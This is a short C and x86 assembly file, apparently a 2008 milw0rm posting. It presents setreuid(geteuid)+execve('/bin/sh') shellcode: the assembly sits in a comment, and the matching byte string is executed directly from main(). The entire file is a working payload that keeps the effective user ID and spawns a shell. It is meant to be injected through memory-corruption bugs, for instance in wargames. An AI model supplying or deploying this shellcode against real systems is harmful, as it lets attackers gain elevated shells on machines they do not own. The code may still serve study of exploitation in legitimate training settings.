/*

setreuid(geteuid, geteuid) + execve(/bin/sh) shellcode - useful for wargames and the like.

global _start

section .text
_start:
        ; geteuid
        push byte 49
        pop eax
        int 0x80

        ; setreuid
        mov ebx, eax
        mov ecx, eax
        push byte 70
        pop eax
        int 0x80

        ; execve
        xor eax,eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        push esp
        pop ebx
        push eax
        push ebx
        mov ecx, esp
        xor edx, edx
        mov byte al,11
        int 0x80
*/

main() {
        char shellcode[] = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50"
			   "\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31"
                           "\xd2\xb0\x0b\xcd\x80";

        (*(void (*)()) shellcode)();
}

// milw0rm.com [2008-08-19]